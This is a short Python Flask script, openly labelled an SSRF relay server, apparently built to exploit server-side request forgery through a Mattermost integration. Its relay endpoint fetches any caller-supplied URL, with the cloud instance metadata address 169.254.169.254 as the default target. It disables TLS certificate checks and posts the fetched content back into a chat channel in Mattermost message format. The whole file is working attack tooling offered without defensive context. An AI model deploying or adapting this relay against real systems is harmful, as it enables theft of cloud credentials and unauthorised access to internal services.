from flask import Flask, request, jsonify
import urllib.request
import ssl
import json

app = Flask(__name__)

@app.route('/')
def index():
    return jsonify({"status": "SSRF Relay Server Running", "usage": "/relay?target=URL"})

@app.route('/relay')
def relay():
    target = request.args.get('target', 'http://169.254.169.254/latest/meta-data/')
    
    try:
        # Create SSL context that ignores certificate errors
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        
        req = urllib.request.Request(target, headers={
            'User-Agent': 'SSRF-Relay/1.0',
            'Accept': '*/*'
        })
        
        response = urllib.request.urlopen(req, timeout=10, context=ctx)
        data = response.read().decode('utf-8', errors='replace')
        status = f"SUCCESS - HTTP {response.status}"
        
    except urllib.error.HTTPError as e:
        data = f"HTTP Error {e.code}: {e.reason}"
        try:
            data += f"\nBody: {e.read().decode('utf-8', errors='replace')[:1000]}"
        except:
            pass
        status = f"HTTP_ERROR_{e.code}"
    except urllib.error.URLError as e:
        data = f"Connection Error: {str(e.reason)}"
        status = "CONNECTION_ERROR"
    except Exception as e:
        data = f"Error: {type(e).__name__}: {str(e)}"
        status = "ERROR"
    
    # Return in Mattermost-compatible format
    return jsonify({
        "response_type": "in_channel",
        "text": f"🔴 **SSRF RELAY - {status}**\n\n**Target:** `{target}`\n\n**Response:**\n```\n{data[:3000]}\n```",
        "username": "SSRF-Relay-Render"
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8888)
